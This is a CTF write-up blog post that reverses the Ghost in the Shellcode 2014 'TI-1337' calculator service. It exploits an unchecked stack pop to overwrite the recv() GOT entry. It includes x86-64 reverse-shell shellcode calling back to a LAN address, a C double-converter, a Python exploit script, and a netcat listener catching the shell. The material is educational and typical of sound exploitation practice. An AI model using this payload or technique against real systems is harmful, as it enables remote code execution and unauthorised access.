+++
author = "pwntester"
categories = ["CTF", "pwnable"]
date = 2014-03-15T18:51:00Z
description = ""
draft = false
slug = "ghost-in-the-shellcode-ti-1337-pwnable"
tags = ["CTF", "pwnable"]
title = "Ghost in the Shellcode: TI-1337 Pwnable"

+++


In this level we were presented with an ELF 64bits executable, a good oportunity to exercise linux exploiting on 64bits systems and try Hopper for the first time :)

When you run the binary, it begins listening in port 31415 (pi!) but if we try to connect, it complains about a missing user "gambino". So we have to create the user. Once created, if we try to connect to the service we get nothing. We can send arbitrary data and if we send strings we get a "Unknown op 'your string here'" error, so it seems like its waiting for commands. Sending numbers dont return any errors.

Since its a network service, we can assume its using fork to spawn new process to attend the incoming requests. We will be using Hopper to dissasamble and revere the binary. So first thing to do is find if there is a fork and of so replace it with a NOP instruction that also sets RAX to 0 so the program can continue as if it was the child process.

fork() call can be found at 0x0000000000400f65 (E8 06 FD FF FF) and if you dont want to be setting gdb to follow child processes, you can use an hex editor to replace it with xor eax,eax; nop; nop; nop (31 c0 90 90 90) as suggested in this [post](https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100)

If the fork goes ok, the child runs this code that uses "call rax" to jump to the main routine. I used gdb to find out the value of rax at that point that turns out to be 0x401567

![](/images/octopress/gits100-1.png)

The first thing it does here is calling a function (sub_401395) that we will rename to receive_command since thats exactly what it does. When it receives data, it stores it in a buffer of 256 bytes that we cannot overflow. When it receives a line terminator (0x0a), it scans the value using sscanf and "%lg" as the format string which stands for a double (number with up to six digits of precision). If the scan is successful the value is stored in an structure along with a 0x1 to indicate its a double value. Any other non numeric value is stored in the same structure but using 0x2 to indicate it was not a number.

Back in the main routine, it checks the structure returned and if it was numeric it calls a function (sub_40149f) that copies the value in a memory area that behaves like a stack, growing to higher memory values. This stack stores the total number of items stored in the first qword followed by a null qword and then the stored items:

```lang-bash line-numbers 
gdb-peda$ x/64x $rdx
0x603140:   0x0000000000000001  0x0000000000000000   <- Beggining of the stack (# items - 0x0)
0x603150:   0x3ff0000000000000  0x0000000000000000   <- (1st item - not used yet)
0x603160:   0x0000000000000000  0x0000000000000000   <- (not used yet - not used yet)
```

If the command sent was not numeric, it uses a jump table (switch) to process the operand. If the command received is bigger than 0x71 = ‘q’ it quits with a "non valid op" error. If its between 0x0 and 0x50 it uses the jump table that after an initial analysis seems to be waiting for the following commands: +,-,*,/,^,!,b,c,.

This looks like a calculator so we try to send some operations and find out what these commands are used for. It turns out to be a reverse notation calculator where you first enter the values and then the operand. This is the meaning of the following operands:

* +: Adds the two values on the top of the stack
* -: Same but substracts
* *: Multiply
* /: Division
* !: ¿?¿?
* ^: power
* b: pops a value from the stack and prints the value
* c: clear the stack, moves the stack pointer to the beggining of the stack and initialize the counter but does not erase stored values.
* .: prints the value on the top of the stack

![](/images/octopress/gits100-2.png)

Note that Hopper cannot reverse the jump table correctly.

Ok, so the vulnerability here is that "b" pop items from the calculator stack but does not check if it reaches the bottom. So we can pop as many values as we want and then send doubles that will be stored in any memory location before the calculator stack. And what do we have there??

```lang-bash line-numbers 
gdb-peda$ x/64x $rdx - 256
0x603040 <strlen@got.plt>:  0x0000000000400b16  0x00007ffff78a0250
0x603050 <htons@got.plt>:   0x00007ffff78c1b90  0x0000000000400b46
0x603060 <htonl@got.plt>:   0x00007ffff78c1b80  0x00007ffff78546d0
0x603070 <pow@got.plt>: 0x0000000000400b76  0x0000000000400b86
0x603080 <close@got.plt>:   0x00007ffff789fa20  0x00007ffff7879df0
0x603090 <__libc_start_main@got.plt>:   0x00007ffff77efdb0  0x00007ffff7803380
0x6030a0 <getpwnam@got.plt>:    0x00007ffff787b670  0x0000000000400be6
0x6030b0 <err@got.plt>: 0x0000000000400bf6  0x00007ffff7828fd0
0x6030c0 <listen@got.plt>:  0x00007ffff78ac820  0x00007ffff78ac700
0x6030d0 <setgid@got.plt>:  0x00007ffff787db90  0x00007ffff78ac6a0
0x6030e0 <exit@got.plt>:    0x0000000000400c56  0x00007ffff787db30
0x6030f0 <fork@got.plt>:    0x0000000000400c76  0x00007ffff78acbb0
0x603100:   0x0000000000000000  0x0000000000000000
0x603110:   0x0000000000007ab7  0x0000000000401a10
0x603120:   0x0000000000000000  0x0000000000000000
0x603130:   0x0000000000000000  0x0000000000000000
0x603140:   0x0000000000000001  0x0000000000000000   <- Beggining of the stack (# items - 0x0)
0x603150:   0x3ff0000000000000  0x0000000000000000   <- (1st item - not used yet)
0x603160:   0x0000000000000000  0x0000000000000000   <- (not used yet - not used yet)
```

The GOT!!!! So we can overwrite any entry in the GOT so that when that function gets called, the program flow will jump to the address we can set there. So we can store our shellcode in the calculator stack and then clear it (not erasing the shellcode) and then pop 38 items so that next value we send will effectively overwrite the GOT entry for recv() with the address of the begining of our shellcode. Next call to recv() will be replaced with a call to our shellcode. Only problem here is that we need to send doubles and account for how they are going to be stored in memory. I couldnt get it working in python (struct.unpack("d", value)) since the precision was not accurate and I couldnt control the values to be written in the stack, so I borrowed the converter used in this [post](https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100) .... yep, I cheated, damn python!

Using that converter:

```lang-clike line-numbers 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, const char *argv[]) {

        /* The address and port for the shellcode */
        #define SCPORT "\x41\x41" /* 16705 */
        #define SCIPADDR "\xc0\xa8\xef\x90" /* 192.168.239.144 */

        /* The shellcode */
        char shellcode[] =
          "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
          "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
          "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
          "\x02"SCPORT"\xc7\x44\x24\x04"SCIPADDR"\x48\x89\xe6\x6a\x10"
          "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
          "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
          "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
          "\x5f\x6a\x3b\x58\x0f\x05"
          /* End with a bunch of NOPs to make sure it's a multiple of 8 */
          "\x90\x90\x90\x90\x90\x90\x90\x90";


        int i;
        for(i = 0; i < strlen(shellcode); i += 8) {
          char buf[1024];
          double d;

          /* Convert the value to a double */
          memcpy(&d, shellcode + i, 8);

          /* Turn the double into a string */
          sprintf(buf, "%.127lg\n", d);
          printf("%s", buf);
        }
        exit(0);
}
```

This program will generate the doubles we need to send in order to place our shellcode that will look like this:

```lang-clike line-numbers 
gdb-peda$ x/64x $rdx
0x603140:   0x0000000000000010  0x0000000000000000
0x603150:   0x3148ff3148c03148  0x6ac0314dd23148f6  <--- shellcode
0x603160:   0x5a066a5e016a5f02  0xc08949050f58296a
0x603170:   0x5241d2314df63148  0x2444c766022404c6
0x603180:   0xc0042444c7414102  0x106ae6894890efa8
0x603190:   0x0f582a6a5f50415a  0x485e036af6314805
0x6031a0:   0x75050f58216aceff  0x5a5e5757ff3148f6
0x6031b0:   0x2f6e69622f2fbf48  0x545708efc1486873
0x6031c0:   0x9090050f583b6a5f  0x0000909090909090  <---- ending nops
0x6031d0:   0x0000000000000000  0x0000000000000000
```

and my exploit:

```lang-python line-numbers 
import socket
import struct
import subprocess
import time

host = "localhost"
port = 31415

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

cmd="/home/pwntester/Desktop/gits-2014/ti-1337/convert"
result = subprocess.check_output(cmd, shell=True)
lines = result.split("\n")
print "[+] Sending shellcode"
for line in lines:
        if line != "":
                print "[+] Sending: " + line
                s.send(line + '\n')

print "[+] Clearing Stack"
s.send('c\n')
print "[+] Popping my way to recv@got"
for i in xrange(38):
        s.send('b\n')
print "[+] Replacing recv@got with shellcode address"
s.send('2261634.5098039214499294757843017578125\n')  # 0x4141414141414141
time.sleep(1)
s.close()
```

Executing this exploit will place 41414141414141 in the GOT entry for recv() so we should get a crash:

```lang-bash line-numbers 
gdb-peda$
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x8
RBX: 0x0
RCX: 0x0
RDX: 0x1
RSI: 0x7fffffffe29f --> 0x10a
RDI: 0x8
RBP: 0x7fffffffe2b0 --> 0x7fffffffe3f0 --> 0x7fffffffe530 --> 0x7fffffffe560 --> 0x7fffffffe590 --> 0x0
RSP: 0x7fffffffe268 --> 0x401357 (mov    QWORD PTR [rbp-0x10],rax)
RIP: 0x400ad0 (<recv@plt>:  jmp    QWORD PTR [rip+0x20254a]        # 0x603020 <recv@got.plt>)
R8 : 0x0
R9 : 0x600000 ('')
R10: 0x0
R11: 0x7ffff7854b0d (ret)
R12: 0x400c90 (xor    ebp,ebp)
R13: 0x7fffffffe670 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
0x0000000000400ad0 in recv@plt ()
gdb-peda$ x/1x 0x000603020
0x603020 <recv@got.plt>:    0x4141414141414141
```

Nice, we can now overwrite the GOT entry with our shellcode address (0x0000000000603150) using this double: 3.114629356634885514212623795744696989099126200464912460920046189338858451871977588458999392410662226841627927565265440233180118e-317

```lang-bash line-numbers 
gdb-peda$ x/x 0x603020
0x603020 <recv@got.plt>:    0x0000000000603150
```

We successfully owerwrite the GOT entry with the shellcode address and we get our shell back:

```lang-bash line-numbers 
root@dragonstone:~# nc -lvp 16705
nc: listening on :: 16705 ...
nc: listening on 0.0.0.0 16705 ...
nc: connect to 192.168.239.144 16705 from 192.168.239.144 (192.168.239.144) 50403 [50403]
pwd
/home/gambino
id
uid=1001(gambino) gid=1000(gambino) groups=1000(gambino)
```



